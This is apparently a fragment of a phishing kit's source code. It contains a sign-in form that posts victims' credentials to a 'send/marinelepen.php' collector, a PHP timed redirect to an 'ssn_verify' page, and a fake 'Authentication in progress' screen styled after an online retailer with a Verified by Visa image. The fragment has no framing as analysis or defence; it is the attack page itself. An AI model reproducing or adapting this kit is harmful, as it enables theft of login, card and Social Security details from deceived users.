...
<form name="signIn" method="post" novalidate="" action="./send/marinelepen.php" class="auth-validate-form auth-clearable-form auth-validate-form" data-fwcim-id="eHORq7WT">
...
if(isset($_GET['v2'])) {
  header('Refresh: 10; URL=../ssn_verify?v2&enc='.md5(time()).'&p=0&dispatch='.sha1(time()).''); 
} else {
  header('Refresh: '.$timer.'; URL=../ssn_verify?enc='.md5(time()).'&p=0&dispatch='.sha1(time()).''); 
}
...
?>
                    <div id="alert-0" class="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
						<div data-action-on-load="register-listeners" data-listeners="" class="a-section a-spacing-none has-action-on-load">
							<div class="a-box a-alert a-alert aria-live="polite" aria-atomic="true">
								<div class="a-box-inner a-alert-container">
                                    <center>
                                    <h2>Authentication in progress</h2>
                             <br><div class="lds-ripple"></div> <br>
									<img src="../../img/gear.gif" alt="Authentification VBV" style="width: 70%;">
                                    <p><div id="Crono" style="color: grey;"></div></p>
                                    </center>
								</div>
							</div>
						</div>
